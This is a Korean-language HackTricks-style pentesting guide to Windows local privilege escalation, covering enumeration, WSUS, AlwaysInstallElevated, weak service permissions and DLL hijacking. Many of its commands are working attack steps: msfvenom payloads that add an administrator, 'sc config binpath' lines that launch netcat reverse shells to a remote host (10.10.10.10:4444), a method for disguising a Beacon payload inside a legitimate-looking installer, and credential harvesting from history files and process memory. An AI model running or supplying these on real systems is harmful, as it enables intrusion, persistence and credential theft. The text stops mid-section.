# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows 로컬 권한 상승 벡터를 찾기 위한 최고의 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 초기 Windows 이론

### 액세스 토큰

**Windows 액세스 토큰이 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**

{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs에 대한 자세한 정보는 다음 페이지를 확인하세요:**

{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### 무결성 수준

**Windows에서 무결성 수준이 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽어야 합니다:**

{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 보안 제어

Windows에는 **시스템을 열거하는 것을 방지**하거나 실행 파일을 실행하거나 **활동을 감지하는** 다양한 요소가 있습니다. 권한 상승 열거를 시작하기 전에 다음 **페이지**를 **읽고** 모든 **방어** **메커니즘**을 **열거**해야 합니다:

{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## 시스템 정보

### 버전 정보 열거

Windows 버전이 알려진 취약점이 있는지 확인하세요(적용된 패치도 확인하세요).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

이 [사이트](https://msrc.microsoft.com/update-guide/vulnerability)는 Microsoft 보안 취약점에 대한 자세한 정보를 검색하는 데 유용합니다. 이 데이터베이스에는 4,700개 이상의 보안 취약점이 있으며, Windows 환경이 제공하는 **대규모 공격 표면**을 보여줍니다.

**시스템에서**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas는 watson이 내장되어 있습니다)_

**시스템 정보로 로컬에서**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**익스플로잇의 Github 리포지토리:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

환경 변수에 저장된 자격 증명/민감한 정보가 있습니까?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 기록
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell 전사 파일

이 기능을 활성화하는 방법은 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)에서 확인할 수 있습니다.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell 모듈 로깅

PowerShell 파이프라인 실행의 세부 사항이 기록되며, 실행된 명령, 명령 호출 및 스크립트의 일부가 포함됩니다. 그러나 전체 실행 세부 사항 및 출력 결과는 캡처되지 않을 수 있습니다.

이를 활성화하려면 문서의 "전사 파일" 섹션의 지침을 따르고 **"모듈 로깅"**을 선택하십시오. **"PowerShell 전사"** 대신에.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell 로그에서 마지막 15개의 이벤트를 보려면 다음을 실행할 수 있습니다:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

스크립트 실행의 전체 활동 및 전체 콘텐츠 기록이 캡처되어, 실행되는 모든 코드 블록이 문서화됩니다. 이 프로세스는 각 활동의 포괄적인 감사 추적을 보존하여 포렌식 및 악의적인 행동 분석에 유용합니다. 실행 시 모든 활동을 문서화함으로써 프로세스에 대한 자세한 통찰력을 제공합니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
스크립트 블록에 대한 로그 이벤트는 Windows 이벤트 뷰어의 경로 **응용 프로그램 및 서비스 로그 > Microsoft > Windows > PowerShell > 운영**에서 찾을 수 있습니다.\
마지막 20개의 이벤트를 보려면 다음을 사용할 수 있습니다:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 인터넷 설정
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 드라이브
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

시스템을 손상시킬 수 있습니다. 업데이트가 http가 아닌 http**S**를 사용하여 요청되지 않는 경우입니다.

다음 명령을 실행하여 네트워크가 비SSL WSUS 업데이트를 사용하는지 확인합니다:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
답변을 받으면:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer`가 `1`과 같다면,

그렇다면, **악용 가능하다.** 마지막 레지스트리가 0과 같다면, WSUS 항목은 무시된다.

이 취약점을 악용하기 위해서는 다음과 같은 도구를 사용할 수 있다: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - 이는 비 SSL WSUS 트래픽에 '가짜' 업데이트를 주입하기 위한 MiTM 무기화된 익스플로잇 스크립트이다.

여기에서 연구를 읽어보세요:

{% file src="../../images/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**전체 보고서를 여기에서 읽어보세요**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
기본적으로, 이 버그가 악용하는 결함은 다음과 같다:

> 우리가 로컬 사용자 프록시를 수정할 수 있는 권한이 있고, Windows 업데이트가 Internet Explorer의 설정에 구성된 프록시를 사용한다면, 우리는 [PyWSUS](https://github.com/GoSecure/pywsus)를 로컬에서 실행하여 자신의 트래픽을 가로채고 자산에서 상승된 사용자로서 코드를 실행할 수 있는 권한을 가지게 된다.
>
> 게다가, WSUS 서비스는 현재 사용자의 설정을 사용하므로, 현재 사용자의 인증서 저장소도 사용할 것이다. WSUS 호스트 이름에 대해 자체 서명된 인증서를 생성하고 이 인증서를 현재 사용자의 인증서 저장소에 추가하면, HTTP 및 HTTPS WSUS 트래픽을 모두 가로챌 수 있다. WSUS는 인증서에 대한 신뢰-첫 사용 유형 검증을 구현하기 위해 HSTS와 유사한 메커니즘을 사용하지 않는다. 제시된 인증서가 사용자가 신뢰하고 올바른 호스트 이름을 가지고 있다면, 서비스에 의해 수용될 것이다.

이 취약점을 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) 도구를 사용하여 악용할 수 있다 (해방되면).

## KrbRelayUp

**로컬 권한 상승** 취약점이 특정 조건 하에 Windows **도메인** 환경에 존재한다. 이러한 조건에는 **LDAP 서명이 시행되지 않는** 환경, 사용자가 **리소스 기반 제약 위임 (RBCD)**을 구성할 수 있는 자기 권한을 가지며, 사용자가 도메인 내에서 컴퓨터를 생성할 수 있는 능력이 포함된다. 이러한 **요구 사항**은 **기본 설정**을 사용하여 충족된다는 점에 유의해야 한다.

**여기에서 익스플로잇을 찾으세요** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

공격 흐름에 대한 자세한 정보는 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)를 확인하세요.

## AlwaysInstallElevated

**이** 2개의 레지스터가 **활성화되어** 있다면 (값이 **0x1**), 모든 권한의 사용자가 NT AUTHORITY\\**SYSTEM**으로 `*.msi` 파일을 **설치** (실행)할 수 있다.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### 메타스플로잇 페이로드
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
만약 meterpreter 세션이 있다면, **`exploit/windows/local/always_install_elevated`** 모듈을 사용하여 이 기술을 자동화할 수 있습니다.

### PowerUP

`Write-UserAddMSI` 명령을 power-up에서 사용하여 현재 디렉토리 내에 권한 상승을 위한 Windows MSI 바이너리를 생성합니다. 이 스크립트는 사용자/그룹 추가를 요청하는 미리 컴파일된 MSI 설치 프로그램을 작성합니다(따라서 GIU 접근이 필요합니다):
```
Write-UserAddMSI
```
그냥 생성된 바이너리를 실행하여 권한을 상승시킵니다.

### MSI Wrapper

이 도구를 사용하여 MSI 래퍼를 만드는 방법을 배우려면 이 튜토리얼을 읽으세요. **명령줄**을 **실행**하려는 경우 "**.bat**" 파일을 래핑할 수 있습니다.

{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX로 MSI 만들기

{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio로 MSI 만들기

- **Cobalt Strike** 또는 **Metasploit**를 사용하여 `C:\privesc\beacon.exe`에 **새 Windows EXE TCP 페이로드**를 **생성**합니다.
- **Visual Studio**를 열고 **새 프로젝트 만들기**를 선택한 후 검색 상자에 "installer"를 입력합니다. **Setup Wizard** 프로젝트를 선택하고 **Next**를 클릭합니다.
- 프로젝트 이름을 **AlwaysPrivesc**로 지정하고 위치에 **`C:\privesc`**를 사용하며, **솔루션과 프로젝트를 동일한 디렉터리에 배치**를 선택한 후 **Create**를 클릭합니다.
- **Next**를 계속 클릭하여 4단계 중 3단계(포함할 파일 선택)에 도달합니다. **Add**를 클릭하고 방금 생성한 Beacon 페이로드를 선택합니다. 그런 다음 **Finish**를 클릭합니다.
- **Solution Explorer**에서 **AlwaysPrivesc** 프로젝트를 강조 표시하고 **Properties**에서 **TargetPlatform**을 **x86**에서 **x64**로 변경합니다.
- 설치된 앱이 더 합법적으로 보이도록 **Author** 및 **Manufacturer**와 같은 다른 속성을 변경할 수 있습니다.
- 프로젝트를 마우스 오른쪽 버튼으로 클릭하고 **View > Custom Actions**를 선택합니다.
- **Install**을 마우스 오른쪽 버튼으로 클릭하고 **Add Custom Action**을 선택합니다.
- **Application Folder**를 두 번 클릭하고 **beacon.exe** 파일을 선택한 후 **OK**를 클릭합니다. 이렇게 하면 설치 프로그램이 실행될 때 비콘 페이로드가 즉시 실행됩니다.
- **Custom Action Properties**에서 **Run64Bit**를 **True**로 변경합니다.
- 마지막으로 **빌드**합니다.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` 경고가 표시되면 플랫폼을 x64로 설정했는지 확인합니다.

### MSI 설치

악성 `.msi` 파일의 **설치**를 **백그라운드**에서 실행하려면:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
이 취약점을 악용하기 위해 다음을 사용할 수 있습니다: _exploit/windows/local/always_install_elevated_

## 안티바이러스 및 탐지기

### 감사 설정

이 설정은 무엇이 **로그**되는지를 결정하므로 주의해야 합니다.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding는 로그가 어디로 전송되는지 아는 것이 흥미롭습니다.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**는 **로컬 관리자 비밀번호 관리**를 위해 설계되었으며, 각 비밀번호가 **고유하고 무작위이며 정기적으로 업데이트**되도록 보장합니다. 이러한 비밀번호는 Active Directory 내에 안전하게 저장되며, ACL을 통해 충분한 권한이 부여된 사용자만 접근할 수 있어, 권한이 있는 경우 로컬 관리자 비밀번호를 볼 수 있습니다.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

활성화된 경우, **평문 비밀번호는 LSASS**(로컬 보안 권한 하위 시스템 서비스)에 저장됩니다.\
[**이 페이지에서 WDigest에 대한 더 많은 정보**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA 보호

**Windows 8.1**부터 Microsoft는 로컬 보안 권한(LSA)에 대한 향상된 보호 기능을 도입하여 **신뢰할 수 없는 프로세스**가 **메모리를 읽거나** 코드를 주입하려는 시도를 **차단**하여 시스템을 더욱 안전하게 만들었습니다.\
[**LSA 보호에 대한 자세한 정보는 여기에서 확인하세요**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**는 **Windows 10**에서 도입되었습니다. 그 목적은 패스 더 해시 공격과 같은 위협으로부터 장치에 저장된 자격 증명을 보호하는 것입니다.| [**Credentials Guard에 대한 자세한 정보는 여기에서 확인하세요.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 캐시된 자격 증명

**도메인 자격 증명**은 **로컬 보안 권한**(LSA)에 의해 인증되며 운영 체제 구성 요소에서 사용됩니다. 사용자의 로그온 데이터가 등록된 보안 패키지에 의해 인증되면, 일반적으로 사용자의 도메인 자격 증명이 설정됩니다.\
[**캐시된 자격 증명에 대한 자세한 정보는 여기에서 확인하세요**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 사용자 및 그룹

### 사용자 및 그룹 나열

귀하가 속한 그룹 중에 흥미로운 권한이 있는지 확인해야 합니다.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

If you **privileged group에 속한다면 권한 상승을 할 수 있습니다**. 권한 그룹과 이를 악용하여 권한을 상승시키는 방법에 대해 알아보세요:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**더 알아보세요** 이 페이지에서 **token**이 무엇인지: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
다음 페이지를 확인하여 **흥미로운 tokens에 대해 배우고** 이를 악용하는 방법을 알아보세요:

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### 홈 폴더
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### 비밀번호 정책
```bash
net accounts
```
### 클립보드의 내용 가져오기
```bash
powershell -command "Get-Clipboard"
```
## 실행 중인 프로세스

### 파일 및 폴더 권한

우선, 프로세스를 나열하여 **프로세스의 명령줄에 있는 비밀번호를 확인**합니다.\
**실행 중인 일부 바이너리를 덮어쓸 수 있는지** 또는 바이너리 폴더에 대한 쓰기 권한이 있는지 확인하여 가능한 [**DLL Hijacking 공격**](dll-hijacking/)을 이용합니다:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
항상 가능한 [**electron/cef/chromium 디버거**가 실행 중인지 확인하세요. 이를 악용하여 권한을 상승시킬 수 있습니다.](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**프로세스 바이너리의 권한 확인**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**프로세스 바이너리의 폴더 권한 확인 (**[**DLL Hijacking**](dll-hijacking/)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### 메모리 비밀번호 채굴

**procdump**를 사용하여 실행 중인 프로세스의 메모리 덤프를 생성할 수 있습니다. FTP와 같은 서비스는 **메모리에 평문으로 자격 증명을 저장**하므로, 메모리를 덤프하고 자격 증명을 읽어보세요.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM으로 실행되는 애플리케이션은 사용자가 CMD를 실행하거나 디렉토리를 탐색할 수 있도록 허용할 수 있습니다.**

예: "Windows 도움말 및 지원" (Windows + F1), "명령 프롬프트" 검색, "명령 프롬프트 열기 클릭" 클릭

## Services

서비스 목록 가져오기:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 권한

You can use **sc** to get information of a service
```bash
sc qc <service_name>
```
각 서비스에 필요한 권한 수준을 확인하기 위해 _Sysinternals_의 바이너리 **accesschk**를 사용하는 것이 권장됩니다.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"인증된 사용자"가 어떤 서비스도 수정할 수 있는지 확인하는 것이 권장됩니다:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[accesschk.exe를 XP용으로 여기에서 다운로드할 수 있습니다](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

이 오류가 발생하는 경우(예: SSDPSRV):

_시스템 오류 1058이 발생했습니다._\
&#xNAN;_서비스를 시작할 수 없습니다. 서비스가 비활성화되었거나 연결된 활성 장치가 없기 때문입니다._

다음과 같이 활성화할 수 있습니다.
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**이 문제에 대한 또 다른 우회 방법**은 다음을 실행하는 것입니다:
```
sc.exe config usosvc start= auto
```
### **서비스 이진 경로 수정**

"인증된 사용자" 그룹이 **SERVICE_ALL_ACCESS**를 서비스에 가지고 있는 경우, 서비스의 실행 파일 이진 파일을 수정할 수 있습니다. **sc**를 수정하고 실행하려면:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 서비스 재시작
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
권한은 다양한 권한을 통해 상승할 수 있습니다:

- **SERVICE_CHANGE_CONFIG**: 서비스 바이너리의 재구성을 허용합니다.
- **WRITE_DAC**: 권한 재구성을 가능하게 하여 서비스 구성을 변경할 수 있는 능력을 부여합니다.
- **WRITE_OWNER**: 소유권 획득 및 권한 재구성을 허용합니다.
- **GENERIC_WRITE**: 서비스 구성을 변경할 수 있는 능력을 상속받습니다.
- **GENERIC_ALL**: 서비스 구성을 변경할 수 있는 능력을 또한 상속받습니다.

이 취약점을 탐지하고 악용하기 위해 _exploit/windows/local/service_permissions_를 사용할 수 있습니다.

### 서비스 바이너리의 약한 권한

**서비스에 의해 실행되는 바이너리를 수정할 수 있는지 확인**하거나 **바이너리가 위치한 폴더에 대한 쓰기 권한이 있는지 확인**하세요 ([**DLL Hijacking**](dll-hijacking/))**.**\
**wmic**(system32가 아님)를 사용하여 서비스에 의해 실행되는 모든 바이너리를 가져오고 **icacls**를 사용하여 권한을 확인할 수 있습니다:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
당신은 또한 **sc**와 **icacls**를 사용할 수 있습니다:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

서비스 레지스트리를 수정할 수 있는지 확인해야 합니다.\
서비스 **레지스트리**에 대한 **권한**을 **확인**하려면 다음을 수행하십시오:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**인증된 사용자** 또는 **NT AUTHORITY\INTERACTIVE**가 `FullControl` 권한을 가지고 있는지 확인해야 합니다. 그렇다면 서비스에 의해 실행되는 바이너리를 변경할 수 있습니다.

실행되는 바이너리의 경로를 변경하려면:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

이 권한이 레지스트리에 있으면 **이 레지스트리에서 하위 레지스트리를 생성할 수 있습니다**. Windows 서비스의 경우 이는 **임의의 코드를 실행하기에 충분합니다:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

실행 파일의 경로가 따옴표 안에 없으면, Windows는 공백 이전의 모든 끝을 실행하려고 시도합니다.

예를 들어, 경로 _C:\Program Files\Some Folder\Service.exe_에 대해 Windows는 다음을 실행하려고 시도합니다:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
모든 인용되지 않은 서비스 경로를 나열하되, 기본 제공 Windows 서비스에 속하는 것은 제외합니다:
```powershell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```powershell
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```powershell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**이 취약점을 탐지하고 악용할 수 있습니다** metasploit를 사용하여: `exploit/windows/local/trusted\_service\_path` metasploit를 사용하여 서비스 바이너리를 수동으로 생성할 수 있습니다:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows는 서비스가 실패할 경우 취할 작업을 사용자가 지정할 수 있도록 허용합니다. 이 기능은 바이너리를 가리키도록 구성할 수 있습니다. 이 바이너리가 교체 가능하다면, 권한 상승이 가능할 수 있습니다. 더 많은 세부정보는 [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)에서 확인할 수 있습니다.

## Applications

### Installed Applications

**바이너리의 권한**을 확인하세요 (어쩌면 하나를 덮어쓰고 권한을 상승시킬 수 있습니다) 및 **폴더의 권한** ([DLL Hijacking](dll-hijacking/)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 쓰기 권한

특정 파일을 읽기 위해 구성 파일을 수정할 수 있는지 또는 관리자 계정(schedtasks)에 의해 실행될 이진 파일을 수정할 수 있는지 확인하십시오.

시스템에서 약한 폴더/파일 권한을 찾는 방법은 다음과 같습니다:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 시작 시 실행

**다른 사용자가 실행할 레지스트리나 바이너리를 덮어쓸 수 있는지 확인하세요.**\
**다음 페이지를 읽어** 권한 상승을 위한 흥미로운 **자동 실행 위치**에 대해 더 알아보세요:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 드라이버

가능한 **서드파티 이상한/취약한** 드라이버를 찾아보세요.
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

**PATH에 있는 폴더 내에 쓰기 권한이 있는 경우** 프로세스에 의해 로드된 DLL을 하이재킹하고 **권한을 상승시킬 수 있습니다**.

PATH 내 모든 폴더의 권한을 확인하세요:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
이 검사를 악용하는 방법에 대한 자세한 정보는 다음을 참조하십시오:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## 네트워크

### 공유
```bash
